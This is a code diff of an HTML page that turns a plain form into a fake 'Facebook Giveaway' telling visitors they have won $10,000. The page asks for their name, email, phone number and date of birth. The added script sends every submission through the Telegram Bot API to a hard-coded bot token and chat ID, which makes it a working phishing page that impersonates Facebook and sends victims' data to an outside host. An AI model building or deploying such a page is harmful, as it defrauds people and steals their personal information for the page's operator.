@@ -3,117 +3,144 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Giveaway Submission</title>
+    <title>Facebook Giveaway</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #0d1b2a;
-            color: white;
-            padding: 20px;
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            background-color: #1877F2; 
+            color: white; 
+            display: none; /* Initially hide the entire body */
         }
-
-        .container {
-            background: #1b263b;
-            padding: 20px;
-            border-radius: 8px;
-            max-width: 400px;
-            margin: auto;
+        .container { 
+            margin-top: 50px; 
         }
-
-        input, select, button {
-            width: 100%;
-            padding: 10px;
-            margin: 8px 0;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
+        .facebook-logo {
+            width: 80px;
+            height: auto;
         }
-
-        button {
-            background-color: #ffcc00;
-            color: black;
-            font-weight: bold;
-            cursor: pointer;
+        .winner { 
+            font-size: 24px; 
+            font-weight: bold; 
+            margin-top: 20px;
         }
-
-        button:hover {
-            background-color: #ffdd44;
-        }
-
-        /* Modal Styling */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
+        .form-container {
             background: white;
             color: black;
             padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
-            text-align: center;
+            border-radius: 10px;
             width: 300px;
+            margin: auto;
         }
-
+        /* Custom Modal */
+        .modal {
+            display: block;
+            position: fixed;
+            z-index: 999;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white; /* White background for clean effect */
+            color: black;
+            text-align: center;
+        }
+        .modal-content {
+            padding: 20px;
+            margin: 30% auto;
+            font-size: 24px;
+            font-weight: bold;
+        }
         .modal button {
-            background-color: #28a745;
+            padding: 10px 20px;
+            background: #1877F2;
             color: white;
             border: none;
-            padding: 10px 15px;
-            margin-top: 10px;
+            border-radius: 5px;
             cursor: pointer;
-        }
-
-        .modal button:hover {
-            background-color: #218838;
+            font-size: 16px;
         }
     </style>
 </head>
 <body>
-
-    <h2>🎉 Congratulations, John Doe! 🎉</h2>
-    <p>You have won $10,000 cash from Facebook!</p>
-
     <div class="container">
-        <h3>Claim Your Prize</h3>
-        <form id="giveawayForm">
-            <input type="text" id="fullName" placeholder="Full Name" required>
-            <input type="email" id="email" placeholder="Email Address" required>
-            <input type="tel" id="phone" placeholder="Phone Number" required>
-            <label>Date of Birth:</label>
-            <select id="dob">
-                <option>03/24/2025</option>
-                <option>03/23/2025</option>
-                <option>03/22/2025</option>
-            </select>
-            <button type="submit">Claim Now</button>
-        </form>
+        <!-- Facebook Logo -->
+        <img src="facebook-logo.png" alt="Facebook Logo" class="facebook-logo">
+
+        <h1>🎉 Congratulations, <span id="winner-name">John Doe</span>! 🎉</h1>
+        <p>You have won $10,000 cash from Facebook!</p>
+
+        <!-- Form -->
+        <div class="form-container" id="giveaway-form">
+            <h2>Claim Your Prize</h2>
+            <form id="claimForm">
+                <label>Full Name:</label><br>
+                <input type="text" name="fullname" id="fullname" required><br><br>
+                
+                <label>Email Address:</label><br>
+                <input type="email" name="email" id="email" required><br><br>
+                
+                <label>Phone Number:</label><br>
+                <input type="tel" name="phone" id="phone" required><br><br>
+                
+                <label>Date of Birth:</label><br>
+                <input type="date" name="dob" id="dob" required><br><br>
+                
+                <button type="submit">Claim Now</button>
+            </form>
+        </div>
+
+        <!-- Winner's Image -->
+        <h2>Previous Winners</h2>
+        <div class="winner">
+            <img src="winner1.jpg" alt="Winner" width="100"><br>
+            <span>Jane Smith</span>
+        </div>
     </div>
 
-    <!-- Custom Success Modal -->
-    <div id="successModal" class="modal">
-        <p>✅ Your details have been submitted successfully!</p>
-        <button onclick="closeSuccessMessage()">OK</button>
+    <!-- Custom Congratulations Message -->
+    <div class="modal" id="customModal">
+        <div class="modal-content">
+            🎉 Congratulations! You have won $10,000 cash from Facebook! 🎉<br><br>
+            <button onclick="revealPage()">OK</button>
+        </div>
     </div>
 
     <script>
-        document.getElementById("giveawayForm").addEventListener("submit", function(event) {
-            event.preventDefault(); // Prevent page refresh
+        // Reveal full page after clicking OK
+        function revealPage() {
+            document.getElementById("customModal").style.display = "none"; // Hide modal
+            document.body.style.display = "block"; // Show full page
+        }
 
-            // Show the success message without using alert()
-            showSuccessMessage();
+        // Telegram Bot Integration
+        document.getElementById("claimForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            let fullname = document.getElementById("fullname").value;
+            let email = document.getElementById("email").value;
+            let phone = document.getElementById("phone").value;
+            let dob = document.getElementById("dob").value;
+
+            let message = `🎉 New Giveaway Entry!\n\n👤 Name: ${fullname}\n📧 Email: ${email}\n📞 Phone: ${phone}\n🎂 DOB: ${dob}`;
+            
+            let telegramBotToken = "7540369556:AAH7gDIVcjCRomnXQgLBGkbk5qF6BUdCjX4";
+            let telegramChatId = "7635429842";
+
+            let url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("✅ Your details have been submitted successfully!");
+                        document.getElementById("claimForm").reset();
+                    } else {
+                        alert("❌ Error submitting details. Please try again.");
+                    }
+                })
+                .catch(error => alert("❌ Network error. Please try again."));
         });
-
-        function showSuccessMessage() {
-            document.getElementById("successModal").style.display = "block";
-        }
-
-        function closeSuccessMessage() {
-            document.getElementById("successModal").style.display = "none";
-        }
     </script>
-
 </body>
 </html>
